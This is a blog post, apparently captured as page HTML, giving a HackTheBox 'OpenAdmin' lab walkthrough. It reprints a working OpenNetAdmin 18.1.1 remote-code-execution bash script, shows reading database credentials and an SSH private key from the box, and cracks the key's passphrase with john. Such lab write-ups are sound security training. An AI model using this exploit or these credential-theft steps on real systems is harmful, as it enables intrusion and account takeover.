@@ -1,0 +1,447 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox OpenAdmin" /><meta name="author" content="Marius Kimmina" /><meta property="og:locale" content="en_US" /><meta name="description" content="0x0 Introduction The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes" /><meta property="og:description" content="0x0 Introduction The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes" /><link rel="canonical" href="https://mindslave.github.io/posts/HackTheBox-OpenAdmin/" /><meta property="og:url" content="https://mindslave.github.io/posts/HackTheBox-OpenAdmin/" /><meta property="og:site_name" content="Marius Kimmina" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-02T08:10:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox OpenAdmin" /><meta name="twitter:site" content="@Mindslave4" /><meta name="twitter:creator" content="@Marius Kimmina" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Marius Kimmina"},"description":"0x0 Introduction The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes","headline":"HackTheBox OpenAdmin","url":"https://mindslave.github.io/posts/HackTheBox-OpenAdmin/","@type":"BlogPosting","dateModified":"2021-04-17T14:04:16+02:00","datePublished":"2020-05-02T08:10:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mindslave.github.io/posts/HackTheBox-OpenAdmin/"},"@context":"https://schema.org"}</script><title>HackTheBox OpenAdmin | Marius Kimmina</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-208027930-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-208027930-1'); }); </script> <script src="https://www.googleoptimize.com/optimize.js?id=OPT-K4ZZSSF"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/avatar/mk_avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marius Kimmina</a></div><div class="site-subtitle font-italic">IT-Security, Hacking and DevOps</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Mindslave" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Mindslave4" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/marius-kimmina-33a328201" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox OpenAdmin</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox OpenAdmin</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Marius Kimmina </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 2, 2020, 8:10 AM +0200" prep="on" > May 2, 2020 <i class="unloaded">2020-05-02T08:10:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 17, 2021, 9:04 PM +0900" prefix="Updated " > Apr 17 <i class="unloaded">2021-04-17T14:04:16+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1699 words">9 min</span></div></div><div class="post-content"><h1 id="0x0-introduction">0x0 Introduction</h1><p>The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin-thumb.png" alt="image" title="Openadmin Logo" /></p><p>0x1 getting a Foothold</p><p>Like most people probably do I started of the box with an nmap scan which returned the following result:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.10.171
+Host is up (0.0058s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Feb  1 06:58:04 2020 -- 1 IP address (1 host up) scanned in 7.02 seconds
+</pre></table></code></div></div><p>ssh is not all that intresting as the attack surface there is rather low. so I decieded to look at the web site hosted at port 80 and found the Apache default page, just like nmap already told us but it never hurts to look ourselfs.<br /> Hoping to find other intresting endpoints on the Website I decided to run gobuster against it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>mindslave@kalibox:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u 10.10.10.171
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.171
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-1.0.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/02/01 07:14:34 Starting gobuster
+===============================================================
+/music (Status: 301)
+/artwork (Status: 301)
+===============================================================
+2020/02/01 07:16:12 Finished
+===============================================================
+</pre></table></code></div></div><p>Looking at these 2 Endpoint we see “SOLMSUSIC” and “ARCWORK”, both sides were created from some template and are filled with lorem ipsum text.</p><p>After going through these sites and not really getting a foothold onto anything, I decieded to run gobuster again with a different list, tbh at this point I got kinda desperate from not finding anything so why not give a shot..</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre>mindslave@kalibox:~/hackthebox/OpenAdmin$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 10.1
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.171
+[+] Threads:        10
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/02/01 10:12:08 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/artwork (Status: 301)
+/ona
+/music (Status: 301)
+/server-status (Status: 403)
+/sierra (Status: 301)
+===============================================================
+2020/02/01 10:12:25 Finished
+===============================================================
+</pre></table></code></div></div><p>This time we found /sierra and /ona, so there is new hope (and this time gobuster also informed me about the .htaccess).<br /> On /sierra we also find a lot of lorem-ipsum text but the /ona endpoint proved to be very interesting because it showed us that OpenNetAdmin is running on the box (something I have personally never heard of before), and it also tells us that it is an outdated version of OpenNetAdmin. A google search for ‘OpenNetAdmin 18.1.1 Exploit’ came back with an RCE as the first result.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+# Exploit Title: OpenNetAdmin v18.1.1 RCE
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&amp;xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+</pre></table></code></div></div><p>Copied that into a local file and we are ready to use it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>mindslave@kalibox:~/hackthebox/OpenAdmin$ ./exploit.sh 10.10.10.171/ona/
+$ whoami
+www-data
+</pre></table></code></div></div><h1 id="0x2-getting-the-usertxt">0x2 Getting the user.txt</h1><p>Now this part of the box took really, and I mean really, long for me.<br /> The first useful thing I found by looking at /etc/home is that there<br /> are 2 users jimmy and joanna from looking at the /etc/passwd we could also learn that jimmy is the admin for the apache server</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/etc/apache2/sites-available/openadmin.conf:    ServerAdmin jimmy@openadmin.htb
+</pre></table></code></div></div><p>And I also found out that you can look into /ona with admin admin as default creds which, ofcourse, still worked</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/opt/ona/docs/INSTALL:8. You can log in as "admin" with a password of "admin"
+</pre></table></code></div></div><p>And I also found these database credentials</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>&lt;?php
+
+$ona_contexts=array (
+  'DEFAULT' =&gt; 
+  array (
+    'databases' =&gt; 
+    array (
+      0 =&gt; 
+      array (
+        'db_type' =&gt; 'mysqli',
+        'db_host' =&gt; 'localhost',
+        'db_login' =&gt; 'ona_sys',
+        'db_passwd' =&gt; 'n1nj4W4rri0R!',
+        'db_database' =&gt; 'ona_default',
+        'db_debug' =&gt; false,
+      ),
+    ),
+    'description' =&gt; 'Default data context',
+    'context_color' =&gt; '#D3DBFF',
+  ),
+);
+</pre></table></code></div></div><p>And ofcoure jimmy reused this database password for his user account, which means we could now log in as jimmy</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>mindslave@kalibox:~$ ssh jimmy@10.10.10.171
+jimmy@10.10.10.171's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Feb  7 05:41:26 UTC 2020
+
+  System load:  0.01              Processes:             146
+  Usage of /:   49.6% of 7.81GB   Users logged in:       2
+  Memory usage: 22%               IP address for ens160: 10.10.10.171
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+41 packages can be updated.
+12 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Feb  7 05:39:24 2020 from 10.10.14.147
+jimmy@openadmin:~$   
+</pre></table></code></div></div><p>Now as Jimmy we want to find out which files belong to us and since all the interesting stuff seems to be in /var we do</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>find /var -user jimmy 
+</pre></table></code></div></div><p>which reveals:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>/var/www/internal
+/var/www/internal/main.php
+/var/www/internal/logout.php
+/var/www/internal/index.php
+</pre></table></code></div></div><p>main.php looked extremly interesting</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span> <span class="p">};</span> 
+<span class="c1"># Open Admin Trusted</span>
+<span class="c1"># OpenAdmin</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Don't forget your "ninja" password<span class="nt">&lt;/h3&gt;</span>
+Click here to logout <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"logout.php"</span> <span class="na">tite = </span><span class="s">"Logout"</span><span class="nt">&gt;</span>Session
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>This file is trying to output joanna’s ssh key, which we would obviously be interested in. running it with a simple “php main.php” we just get a permission denied tho. I then tried to access these files via the browser but could not find them on 10.10.10.171/main.php neither 10.10.10.171/internal/main.php, which after a while got me thinking that they might be runnig on a different port</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name             
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
+</pre></table></code></div></div><p>Which turned out to be correct, the /internal pages are running on port 52846 and a simple curl gave us the ssh key</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
+<span class="nt">&lt;pre&gt;</span>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+<span class="nt">&lt;/pre&gt;&lt;html&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Don't forget your "ninja" password<span class="nt">&lt;/h3&gt;</span>
+Click here to logout <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"logout.php"</span> <span class="na">tite = </span><span class="s">"Logout"</span><span class="nt">&gt;</span>Session
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>Now before we can use this to connect as joanna we have to find the password the Key, lets ask our friend John. First convert the file into john-readable format:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/usr/share/john/ssh2john.py id_rsa &gt; johnfile.txt
+</pre></table></code></div></div><p>Now we can use this john to recover the password from the johnfile.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>mindslave@kalibox:~/hackthebox/OpenAdmin/ssh$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 8 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)
+Warning: Only 2 candidates left, minimum 8 needed for performance.
+1g 0:00:00:02 DONE (2020-02-07 08:27) 0.3745g/s 5371Kp/s 5371Kc/s 5371KC/sa6_123..*7¡Vamos!
+Session completed
